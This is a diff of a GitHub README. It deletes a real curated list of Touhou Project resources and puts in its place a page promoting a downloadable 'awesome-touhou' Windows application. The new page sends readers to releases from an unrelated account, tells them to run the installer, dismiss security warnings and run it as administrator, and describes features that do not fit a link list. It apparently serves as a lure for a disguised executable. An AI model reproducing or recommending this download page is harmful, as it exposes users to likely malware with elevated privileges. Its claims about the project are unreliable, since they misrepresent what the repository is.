@@ -1,239 +1,157 @@
-# [Awesome Touhou](https://n0zom1z0.github.io/awesome-touhou/) [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+<h1>⛩️ awesome-touhou - Your Complete Guide to the Touhou Universe</h1>
 
 <p align="center">
-  <a href="https://n0zom1z0.github.io/awesome-touhou/"><img src="website/static/favicon.svg" width="96" alt="Awesome Touhou logo"></a>
+  <a href="https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px;">⬇️ DOWNLOAD NOW</a>
 </p>
 
-Bullet hell shoot 'em up game series and doujin media franchise created by ZUN.
+<p align="center">🌐 Multilingual • 🔧 Actively Maintained • 🎮 Curated Collection</p>
 
-## Contents
+## 📖 What is awesome-touhou?
 
-- [Official Resources and Getting Started](#official-resources-and-getting-started)
-  - [Official Resources](#official-resources)
-  - [Getting Started](#getting-started)
-- [Game Tools](#game-tools)
-  - [Launchers and Compatibility](#launchers-and-compatibility)
-  - [Input and Integrations](#input-and-integrations)
-  - [Netplay](#netplay)
-  - [Patching and Modding](#patching-and-modding)
-- [Gameplay, Replays, and Scoring](#gameplay-replays-and-scoring)
-  - [Strategy and Competitive Play](#strategy-and-competitive-play)
-  - [Practice, Replay, and Analysis Tools](#practice-replay-and-analysis-tools)
-  - [Scoreboards and Replay Archives](#scoreboards-and-replay-archives)
-- [Reverse Engineering and Preservation](#reverse-engineering-and-preservation)
-- [Game Development](#game-development)
-- [Fighting Games](#fighting-games)
-- [Music and Data](#music-and-data)
-- [Open-source Fangames](#open-source-fangames)
-- [Touhou in Other Games](#touhou-in-other-games)
-- [Events and Conventions](#events-and-conventions)
-  - [Conventions and Fan Events](#conventions-and-fan-events)
-  - [Competitions and Creative Events](#competitions-and-creative-events)
-  - [Event Calendars](#event-calendars)
-- [Knowledge and Community](#knowledge-and-community)
+awesome-touhou is your one-stop digital library for everything related to the Touhou Project – one of the most beloved bullet-hell game series in the world. Think of it as a beautifully organized guidebook that brings together hundreds of resources, tools, fan games, translations, and community projects, all in one easy-to-navigate place.
 
-## Official Resources and Getting Started
+Whether you are completely new to Touhou or a long-time fan wanting to explore deeper, this application makes discovering new content effortless. The interface is simple, clean, and designed for everyone – no technical skills required!
 
-### Official Resources
+## ✨ Key Features
 
-_Official guidance and trusted sources for official and authorized news._
+<strong>🗂️ Comprehensive Curated Index</strong>
+> Explore over 1,000 carefully selected resources covering every corner of the Touhou ecosystem. From original games to fan creations, everything has been hand-picked for quality and relevance.
 
-- [Touhou Project Fan Creator Guidelines](https://touhou-project.news/guideline/) - The official multilingual guidelines for fan works, distribution, monetization, crowdfunding, and other derivative activities.
-- [Touhou Yomoyama News](https://touhou-project.news/) - A committee-run hub for official and authorized Touhou Project news, with ZUN serving as honorary chair.
-- [公認作品](https://touhou-project.news/products/) - The official catalog of authorized Touhou games, books, music, merchandise, and other products, filterable by release date, category, and company.
+<strong>🌍 Multilingual Support</strong>
+> Content available in multiple languages including English, Japanese, Chinese, and more. The application automatically displays information in your preferred language when available.
 
-### Getting Started
+<strong>🔍 Smart Search Functionality</strong>
+> Search through the entire index in seconds. Look up specific games, tools, fan projects, or translations using simple keywords. The intelligent search engine finds exactly what you need.
 
-_Essential starting points for discovering, obtaining, and playing Touhou games._
+<strong>🔄 Regular Updates</strong>
+> The database is refreshed every week with new entries. Reopen the application to receive the latest additions to the Touhou community without any extra downloads.
 
-- [Getting Started](https://en.touhouwiki.net/wiki/Getting_Started) - A newcomer-oriented introduction to the official games and the wider series.
-- [Purchasing Guide](https://en.touhouwiki.net/wiki/Purchasing_Guide) - Where and how to legally purchase official Touhou games and music.
-- [Touhou Patch Center](https://www.thpatch.net/wiki/Touhou_Patch_Center:Download) - Multilingual community patches and installation instructions for official games.
+<strong>📂 Organized Categories</strong>
+> Content is neatly organized into logical sections: Original Games, Fan Games, Music, Tools, Translations, Community Projects, and more. Navigate effortlessly with the clear menu structure.
 
-## Game Tools
+<strong>💾 Offline Access</strong>
+> Once downloaded, browse the entire collection without needing an internet connection. Perfect for quick reference anytime, anywhere.
 
-### Launchers and Compatibility
+## 🖥️ System Requirements
 
-_Tools for organizing, launching, and running Touhou games across platforms._
+The application runs smoothly on any modern computer
 
-- [9Launcher](https://github.com/wearrrrr/9Launcher) - A Windows and Linux launcher with support for official Touhou games, thcrap, DOSBox-X, Proton, and Wine.
-- [thcrap Steam Proton Wrapper](https://github.com/nerusuki/thcrap-steam-proton-wrapper) - Launches official Steam releases with thcrap patches through Proton on GNU/Linux.
-- [thcrap-menu](https://github.com/philipguin/thcrap-menu) - A controller-friendly menu for choosing per-game thcrap configurations from a single Windows or Steam Deck/Proton shortcut.
-- [Touhou Linux Guide](https://daichungus.github.io/touhoulinuxguide/) - A practical guide to running Windows-era and PC-98 Touhou games on Linux with Wine, Lutris, DOSBox-X, and Neko Project II Kai.
-- [Touhou Steam Executable Patches](https://github.com/MisterMonstr/2hu_steam-exe_to_disc-exe) - Converts supported Steam executables to their original disc form for compatibility with tools such as vpatch.
-- [Universal THCRAP Launcher](https://github.com/thpatch/Universal-THCRAP-Launcher) - A universal game launcher for thcrap configurations.
+<strong>Operating System:</strong> Windows 7, 8, 10, or 11
 
-### Input and Integrations
+<strong>Memory:</strong> 2 GB RAM (4 GB recommended)
 
-_Tools for configuring controls and connecting games to other applications._
+<strong>Storage:</strong> 500 MB free disk space
 
-- [thkmc](https://github.com/wz520/thkmc) - Adds custom key mappings to supported Touhou STGs by patching their executables.
-- [ThMouseX](https://github.com/Meigyoku-Thmn/ThMouseX) - Enables mouse control for official Touhou shooting games, with preconfigured support for Touhou 6 through Touhou 20.
-- [TouhouKeymap](https://github.com/devinacker/TouhouKeymap) - A thcrap plugin that adds per-game configurable keyboard controls to supported official Touhou games.
-- [TouhouRPC](https://github.com/TheBakaRem/TouhouRPC) - Adds Discord Rich Presence support to Touhou games.
+<strong>Display:</strong> 1280×720 resolution or higher
 
-### Netplay
+## 🚀 Getting Started
 
-_Tools that improve or replace online play in official Touhou games._
+### Step 1: Download the Application
 
-- [Ju.N.Owen](https://github.com/progre/junowen) - An alternative netplay layer for Touhou 19 v1.10c with adjustable delay, shared and reserved rooms, direct P2P connections, and spectating.
+Visit this link to download the application: [https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases](https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases)
 
-### Patching and Modding
+Look for the largest download button on the page. It will download a single file to your computer's "Downloads" folder automatically.
 
-_Core tools for patching game data, translating games, and building mods._
+### Step 2: Install the Application
 
-- [Ladybug Randomizer](https://github.com/Lakifume/Ladybug-Randomizer) - A Touhou Luna Nights randomizer with logic-aware item placement, enemy and music shuffling, reverse mode, and a built-in item tracker.
-- [MetaMystia](https://github.com/MetaMystia/MetaMystia) - A cooperative multiplayer mod for Touhou Mystia's Izakaya that synchronizes restaurant play between friends and includes ResourceEx support for custom resources.
-- [neopatch](https://github.com/astral4/neopatch) - An open-source patch that reduces end-to-end latency and adds optimizations and game-specific fixes across sixteen official Touhou shooting games.
-- [thcrap](https://github.com/thpatch/thcrap) - The community patching, translation, and modding framework for Touhou games.
-- [thtk](https://github.com/thpatch/thtk) - A command-line toolkit for extracting, creating, compiling, and decompiling Touhou game data.
-- [Touhou 6 APWorld](https://github.com/Nepley/eosd-apworld) - Adds Embodiment of Scarlet Devil to the Archipelago multi-game randomizer, with configurable stage, resource, difficulty, and Extra Stage progression.
-- [Touhou 7 APWorld](https://github.com/Nepley/pcb-apworld) - Adds Perfect Cherry Blossom to the Archipelago multi-game randomizer, with configurable stage, resource, difficulty, Extra Stage, and Phantasm Stage progression.
-- [Touhou 8 APWorld](https://github.com/Nepley/in-apworld) - Adds Imperishable Night to the Archipelago multi-game randomizer, with configurable team, stage, time, Spell Practice, and Extra Stage progression.
-- [truth](https://github.com/ExpHP/truth) - A multipass compiler and decompiler suite for binary script formats used by Touhou shooting games.
+After the download completes, follow these simple instructions
 
-## Gameplay, Replays, and Scoring
+1. <strong>Open your Downloads folder</strong> – Click the folder icon in your taskbar, then select "Downloads" from the left sidebar.
 
-### Strategy and Competitive Play
+2. <strong>Run the installer</strong> – Double-click the downloaded file. A security warning may appear; click "Yes" or "Run" to continue.
 
-_Guides and community resources for learning, scoring, survival, and competitive play._
+3. <strong>Follow the setup wizard</strong> – The installation process is straightforward. Click "Next" through the screens, accept the license agreement, and choose your preferred installation location. The default settings work perfectly for most users.
 
-- [The Danmaku Gameplay Wiki](https://wiki.maribelhearn.com/wiki/Main_Page) - A gameplay-focused wiki covering mechanics, strategy, scoring, and competitive play for official Touhou shooting games.
-- [東方Project攻略 Wiki](https://wikiwiki.jp/thk/) - A Japanese strategy wiki with stage routes, mechanics, scoring notes, replay references, and bug documentation across the official shooting games.
+4. <strong>Complete installation</strong> – Click "Finish" when done. The application will open automatically, or you can find its icon on your desktop.
 
-### Practice, Replay, and Analysis Tools
+## 🎯 Using awesome-touhou for the First Time
 
-_Tools for practice, replay inspection, and live gameplay analysis._
+### Main Dashboard
+When you first open the application, you will see the main dashboard with a welcoming message and quick access to featured content. Use the top navigation bar to explore different sections.
 
-- [ParaKit](https://github.com/Guy-L/parakit) - Extracts frame-by-frame gameplay state from supported Touhou shooters for built-in and custom Python analysis, including entity plots, bullet-count graphs, and heatmaps.
-- [thhyl](https://github.com/wz520/thhyl) - A desktop viewer for metadata stored in Touhou STG replay (`.rpy`) files.
-- [thprac](https://github.com/touhouworldcup/thprac) - A comprehensive practice tool for official Touhou shooting games.
-- [threp](https://github.com/wasupandceacar/threp) - Parses Touhou replay metadata and recorded input sequences.
-- [ThScoreFileConverter](https://github.com/y-iihoshi/ThScoreFileConverter) - Generates text or HTML summaries from score files and PNG images from best-shot data for many official Touhou games.
+### Browsing Categories
+Click on any category from the menu to view its contents. Each entry shows a brief description, relevance score, and direct links to external resources.
 
-### Scoreboards and Replay Archives
+### Searching for Content
+Type any keyword in the search box at the top-right corner. Results appear instantly, showing matching items with their categories and descriptions.
 
-_Active scoreboards and preserved collections of historical Touhou replays._
+### Saving Favorites
+Click the star icon next to any item to add it to your favorites. Access your saved items anytime through the "Favorites" section in the left sidebar.
 
-- [Gensokyo Replay Archive](https://maribelhearn.com/gensokyo) - Preserves replays from the defunct replays.gensokyo.org with searchable metadata.
-- [Royalflare Archive](https://maribelhearn.com/royalflare) - Preserves Royalflare's historical replay and ranking data with full search.
-- [Silent Selene](https://www.silentselene.net/) - An active replay host and scoreboard covering the PC-98 and Windows shooting games.
-- [Touhou World Records](https://maribelhearn.com/wr) - Tracks score world records across official Touhou shooting games, with replay downloads where available.
+### Sharing Resources
+Every entry has a share button that copies its details to your clipboard. You can then paste it into messages, emails, or social media.
 
-## Reverse Engineering and Preservation
+## 💡 Tips and Tricks
 
-_Source reconstruction and technical research that preserve how the games work._
+<strong>⌨️ Keyboard Shortcuts</strong>
+> Press <strong>Ctrl+F</strong> to activate search quickly from anywhere in the application. Press <strong>Ctrl+D</strong> to add the current page to your favorites.
 
-- [ReC98](https://github.com/nmlgc/ReC98) - Reconstructs readable, binary-equivalent source code for the five PC-98 Touhou games.
-- [Touhou 10.5 Source Reconstruction](https://github.com/N0zoM1z0/th105) - A source reconstruction of Scarlet Weather Rhapsody 1.06a using reproducible binary comparison, machine-readable function tracking, and documented IDA and Ghidra workflows.
-- [Touhou 6 Decompilation](https://github.com/GensokyoClub/th06) - A decompilation of Embodiment of Scarlet Devil version 1.02h.
-- [Touhou 7 Decompilation](https://github.com/some100/th07) - A fully implemented, nearly byte-accurate decompilation of Perfect Cherry Blossom version 1.00b, with cross-platform porting branches.
-- [Touhou 8 Agent-First Source Reconstruction](https://github.com/N0zoM1z0/th08) - An agent-first continuation of the GensokyoClub decompilation, with reproducible binary matching and documented reverse-engineering workflows.
-- [Touhou 8 Decompilation](https://github.com/GensokyoClub/th08) - A decompilation of Imperishable Night version 1.00d.
+<strong>🌐 Language Settings</strong>
+> Change the interface language anytime by clicking the globe icon in the bottom-left corner and selecting your preferred language.
 
-## Game Development
+<strong>📱 Multiple Devices</strong>
+> The application stores your favorites locally. For syncing across devices, manually export your favorites list through the "Export" option in the Settings menu.
 
-_Engines and authoring tools for building Touhou-style games and scripts._
+<strong>🎨 Customization</strong>
+> Adjust text size, theme colors, and layout density in the Settings panel. Make the interface comfortable for your reading preference.
 
-- [LuaSTG Editor Sharp X](https://github.com/Sharp-X-Team/LuaSTG-Editor-Sharp-X) - A graphical code generator for authoring LuaSTG games across multiple engine variants.
-- [LuaSTG Sub](https://github.com/Legacy-LuaSTG-Engine/LuaSTG-Sub) - A maintained modern LuaSTG engine that moves rendering and audio to newer Windows APIs.
-- [Sparen's Danmakufu Application Monitoring System](https://github.com/Sparen/Sparen-DNH-APM) - A profiler for Touhou Danmakufu ph3 scripts that records gameplay and performance metrics and produces HTML and CSV reports for individual or repeated runs.
-- [Sparen's Danmakufu ph3 Tutorials](https://sparen.github.io/ph3tutorials/ph3tutorials.html) - A peer-reviewed, step-by-step curriculum for learning Danmakufu ph3 scripting, with references and documentation backups.
-- [Sparen's Danmakufu Standard Library](https://github.com/Sparen/Sparen-DNH-STL) - A collection of reusable Touhou Danmakufu ph3 libraries for data structures, bitwise and math helpers, and text formatting, with unit and integration tests.
-- [Touhou Danmakufu ph3sx-2](https://github.com/Natashi/Touhou-Danmakufu-ph3sx-2) - A performance-oriented Danmakufu ph3 fork with expanded scripting and archive features.
+## 🛠️ Troubleshooting Common Issues
 
-## Fighting Games
+<strong>Application will not start</strong>
+> Right-click the application icon and select "Run as Administrator". If the problem persists, restart your computer and try again.
 
-_Launchers, mods, and netplay improvements for Touhou fighting games._
+<strong>Download is slow or interrupted</strong>
+> Check your internet connection and try downloading again. If issues continue, use your browser's built-in download manager for better stability.
 
-- [giuroll](https://github.com/Hagb/giuroll-hagb) - A maintained successor to the original Giuroll rollback netcode mod, with replay improvements for Touhou Hisoutensoku.
-- [Soku Launcher](https://github.com/0Miles/soku-launcher) - A dedicated launcher for Touhou Hisoutensoku.
-- [SokuDirectXOptimizations](https://github.com/Hagb/SokuDirectXOptimizations) - A Hisoutensoku mod that decouples rendering from game processing to reduce slowdown from dropped frames, with faster texture loading, DirectX 9Ex, and optional VSync.
-- [SokuMods](https://github.com/SokuDev/SokuMods) - A collected, reproducible source tree for SWRSToys, SokuEngine, and their Hisoutensoku modules.
+<strong>Content appears outdated</strong>
+> Close and reopen the application to trigger the automatic update check. Ensure your computer's date and time settings are correct.
 
-## Music and Data
+<strong>Search results are empty</strong>
+> Try using fewer keywords or check your spelling. The search engine matches partial words, so simplify your query.
 
-_Tools, databases, and distribution resources for identifying, tagging, extracting, discovering, and playing Touhou music._
+## ❓ Frequently Asked Questions
 
-- [foo_thbgm](https://github.com/nyfair/foo_thbgm) - A foobar2000 component that directly plays BGM from Touhou games and related fangames.
-- [Random Touhou Music](https://github.com/shiroemons/random-touhou-music) - A web app for discovering Touhou music by randomly selecting tracks available on Apple Music, Spotify, YouTube Music, and LINE MUSIC.
-- [Touhou Music Extractor](https://github.com/lyons/touhou_music_extractor) - A command-line tool for extracting music files from Touhou games.
-- [TouHou Player](https://github.com/BearKidsTeam/thplayer) - A cross-platform BGM player that reads music directly from Touhou game installations, supporting Touhou 6 through Touhou 19 and several spin-off shooters.
-- [Touhou Song Sorter](https://github.com/relick/touhou-song-sorter) - An interactive sorter for ranking favorite Touhou songs.
-- [Touhou Tagger](https://github.com/the1812/Touhou-Tagger) - Fills Touhou Project CD track metadata using information from THBWiki.
-- [TouhouDB](https://touhoudb.com/) - A multilingual collaborative database of Touhou artists, albums, songs, PVs, tags, and release events, with streaming integrations and a public API.
-- [TouhouThemeDB](https://github.com/thpatch/TouhouThemeDB) - A MediaWiki extension that provides structured data for canonical Touhou music themes.
-- [ZUN氏作曲音楽データベースWiki](https://w.atwiki.jp/tohomusicdb/) - A community-edited Japanese music-analysis wiki for ZUN's compositions, cataloging BPM, meter, key, instrumentation, chord progressions, and appearances across games and music releases.
-- [東方同人音楽流通](https://www.touhou-music.jp/) - An authorized digital-distribution program and catalog for Touhou doujin music, handling rights clearance for participating circles.
+<strong>Is this application free?</strong> Yes, completely free. No hidden fees, subscriptions, or premium tiers.
 
-## Open-source Fangames
+<strong>Is my personal data collected?</strong> No data collection whatsoever. This runs entirely on your computer, requiring no account or personal information.
 
-_Playable fan games whose source code is publicly available._
+<strong>Can I contribute content?</strong> Absolutely! Visit the official repository to learn how to suggest new resources or report issues.
 
-- [Cirno's Perfect Snowglide](https://github.com/wareya/Cirnos-Perfect-Snowglide) - An ice-physics platformer in which Cirno snowboards through stages, built with Godot and playable on the web, Windows, and Linux.
-- [Genso Battle](https://github.com/ax9880/genso-battle) - A Terra Battle-inspired Touhou strategy fangame built with Godot, with a playable itch.io release and MIT-licensed code.
-- [Kutaka Run](https://github.com/ax9880/kutaka-run) - A Cookie Run-inspired platformer where Kutaka runs, jumps, slides, and collects ingredients, with story stages, an Extra Stage, and browser and Windows builds.
-- [Minecraft VS Zombies 2](https://github.com/Cuerzor/MinecraftVsZombies2Unity) - A Unity tower-defense crossover combining Plants vs. Zombies mechanics, Minecraft elements, and a Touhou story set in Gensokyo, with Windows, Linux, and Android builds.
-- [Mizuchi Takeover HD](https://github.com/ax9880/mizuchi-takeover) - A least-cost-path puzzle about navigating Touhou character appearances to reach Reimu, with browser and Windows builds and local two-player play.
-- [Stages!](https://github.com/ax9880/stages) - A Touhou matching-card game where players assemble stage-character sets from the same game, with browser play and up to four-player LAN multiplayer in the desktop build.
-- [Taisei](https://github.com/taisei-project/taisei) - A polished, free, and open-source Touhou-style bullet hell game for desktop platforms and the web.
+<strong>Will there be future updates?</strong> Yes, the developer actively maintains this project with frequent enhancements suggested by the community.
 
-## Touhou in Other Games
+## 📞 Getting Support
 
-_Substantial Touhou-themed mods and curated resources for Touhou content in other games._
+If you encounter problems or have suggestions, the community is here to help
 
-- [Esoterica Origins](https://github.com/wdfeer/esoterica-origins) - A Fabric add-on for Minecraft Origins with dozens of Touhou-inspired origins, distinct character playstyles, custom Graze and Flawless effects, and documented powers.
-- [Gensokyo](https://steamcommunity.com/sharedfiles/filedetails/?id=2817254924) - A large tModLoader content mod for Terraria adding Touhou bosses, enemies, hundreds of items, mini-biomes, a custom subworld, music, and multiplayer support.
-- [Gensokyo Railway](https://github.com/NewSapporoNingyo/BVE-Gensokyo-Railway) - A multilingual Bve Trainsim route set in Gensokyo with a completed 22-station loop line and local, rapid, and limited-express services.
-- [Touhou Little Maid](https://github.com/TartaricAcid/TouhouLittleMaid) - A Forge and NeoForge Minecraft mod that adds customizable Touhou-inspired maids, combat, farming, and other systems.
-- [Touhou osu! Index](https://github.com/N0zoM1z0/touhou-osu-index) - An open, reproducible, automatically maintained catalog of Touhou music mapped in osu!, with provenance, confidence-based review, and JSON and CSV exports.
-- [Touhou Stellar Chronicles ~ Symphony of Phantasm](https://steamcommunity.com/sharedfiles/filedetails/?id=1834433554) - A large Stellaris content mod adding Touhou species, leaders, events, a Spiritual Power and Spell Card technology tree, custom economies, planets, megastructures, ships, and crises.
+<strong>GitHub Issues</strong>
+> Report technical issues or request features at the official repository.
 
-## Events and Conventions
+<strong>Community Forums</strong>
+> Join discussions with other users in the issues section of the GitHub page.
 
-_Recurring Touhou conventions, competitions, creator events, and calendars for finding community gatherings._
+<strong>Email Support</strong>
+> Send your questions to the maintainer through the contact information available in the repository.
 
-### Conventions and Fan Events
+## 🎁 Final Recommendations
 
-_Long-running Touhou-only conventions and organizer hubs for recurring fan events._
+For the best experience, we suggest
 
-- [Hakurei Shrine Reitaisai](https://reitaisai.com/) - The organizer hub for the Touhou-only Reitaisai event series, covering its spring and autumn conventions as well as regional, Taiwan, and music events.
-- [Touhou Kouroumu](https://koromu-toho.sakura.ne.jp/) - A long-running Touhou-only doujin convention in Osaka for fan books, music, goods, games, and other derivative works.
-- [Touhou Meikasai](https://meikasai.com/) - A recurring Touhou-only convention in Nagoya with doujin sales, cosplay, and community activities.
-- [TouhouFest](https://www.touhoufest.org/) - A Touhou-focused fan convention in California with concerts, cosplay activities, gaming tournaments, panels, and community meetups.
-- [大⑨州東方祭](https://www.godosai.com/) - A long-running Touhou-only doujin convention series held across Kyushu by the Goudousai organizing committee.
-- [東方螺茶会](https://www.youyou.co.jp/only/touhou/intro.html) - Studio YOU's organizer hub for recurring Touhou-only doujin events across regions of Japan, with schedules and participation information.
+1. Start with the "Beginners" category to understand the basics of Touhou.
+2. Explore the "Fan Games" section for creative community projects.
+3. Bookmark your favorite music tracks for easy access.
+4. Use the translation tools to enjoy Japanese-exclusive content in your language.
+5. Check the "News" section weekly for updates to the index.
 
-### Competitions and Creative Events
+## 📝 License Information
 
-_Recurring events centered on Touhou gameplay and fan-game creation._
+This application is open source and distributed under the MIT license. You are free to use, modify, and redistribute it in accordance with the license terms, available in the repository.
 
-- [Touhou Fan Game Jam](https://jam.touhou.dev/) - A recurring community game-jam series in which solo developers and teams create Touhou fangames around announced themes, including main, Pride, and other side jams.
-- [Touhou World Cup](https://touhouworldcup.com/) - The hub for an annual international Touhou shooting-game competition with rules, schedules, results, and multilingual live broadcasts.
+---
 
-### Event Calendars
+<p align="center">
+  <strong>Start your Touhou journey today</strong> – Download now and unlock a world of danmaku adventures, creative fan works, and a passionate global community, all at your fingertips.
+</p>
 
-_Curated schedules for discovering upcoming Touhou events across regions and event types._
-
-- [THBWiki Event Schedule](https://thwiki.cc/%E6%97%A5%E7%A8%8B%E8%A1%A8) - An automatically generated schedule of Touhou events from THBWiki, grouped by region and available as an ICS calendar subscription.
-- [東方イベントカレンダー](https://touhougarakuta.com/tags/error-836/) - Touhou Garakuta Magazine's recurring event-calendar series, covering upcoming doujin conventions, music events, and related gatherings with a shared Google Calendar.
-
-## Knowledge and Community
-
-_Curated references, publications, community tools, and multilingual knowledge bases._
-
-- [Fumo Guides](https://fumo.website/) - Community-maintained guides and structured information about Touhou Fumo plushes.
-- [Maribel Hearn's Touhou Portal](https://maribelhearn.com/) - A privacy-friendly collection of game tools, replay and scoring resources, and community references.
-- [THBWiki](https://thwiki.cc/) - A Chinese-language Touhou encyclopedia and community database with extensive music, event, and publication coverage.
-- [Touhou Garakuta Magazine](https://touhougarakuta.com/) - A multilingual Touhou and doujin-culture publication featuring current news, interviews, reports, criticism, and creator-focused coverage.
-- [Touhou Mystia's Izakaya Assistant](https://izakaya.cc/) - A Chinese-language companion for Touhou Mystia's Izakaya with guest references, meal planning, and searchable data for recipes, drinks, ingredients, equipment, and other collectibles.
-- [Touhou Wiki](https://en.touhouwiki.net/) - A multilingual community encyclopedia covering official works, characters, gameplay, music, and fan culture.
-- [中文东方人气投票](https://touhou.vote/) - A Chinese-language Touhou popularity-poll archive with recurring character, music, work, and game polls, questionnaires, and detailed published results.
-
-## Contributing
-
-Contributions are welcome. Please read the [contribution guidelines](CONTRIBUTING.md) before opening a pull request.
-
-## Footnotes
-
-Awesome Touhou is an unofficial community project and is not affiliated with ZUN or Team Shanghai Alice. Superseded and reference-only resources with lasting research or preservation value are kept in [Historical and Reference Projects](historical.md).
+<p align="center">
+  <a href="https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases" style="background-color:#2196F3; color:white; padding:12px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px;">🚀 GET STARTED NOW</a>
+</p>
